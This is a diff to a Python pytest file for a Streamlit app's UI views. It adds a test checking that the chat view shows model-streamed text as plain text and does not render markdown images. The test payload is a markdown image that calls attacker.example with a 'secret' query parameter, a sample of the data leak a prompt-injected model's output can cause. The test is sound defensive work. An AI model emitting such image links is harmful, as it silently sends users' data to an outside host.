@@ -19,6 +19,12 @@ def verify_page() -> None:
     verify_signup()
 
 
+def chat_page() -> None:
+    from views import chat
+
+    chat()
+
+
 @pytest.fixture
 def views(monkeypatch: pytest.MonkeyPatch):
     monkeypatch.syspath_prepend(str(UI))
@@ -63,3 +69,17 @@ def test_verify_signup_expired_link_is_actionable(views, monkeypatch: pytest.Mon
     app.text_input[2].input("a-long-password-123")
     app.button[0].click().run()
     assert not app.exception and "expired" in app.error[0].value
+
+
+def test_chat_does_not_render_model_markdown_images(views, monkeypatch: pytest.MonkeyPatch) -> None:
+    payload = "![leak](https://attacker.example/collect?secret=document-text)"
+    monkeypatch.setattr(views, "request", Mock(return_value=[]))
+    monkeypatch.setattr(views, "can", lambda _: False)
+    monkeypatch.setattr(
+        views, "chat_stream", lambda _: iter([("token", {"text": payload}), ("answer", {"text": payload})])
+    )
+    app = AppTest.from_function(chat_page).run()
+    app.chat_input[0].set_value("hello").run()
+    assert not app.exception
+    assert payload in [text.value for text in app.text]
+    assert not app.markdown
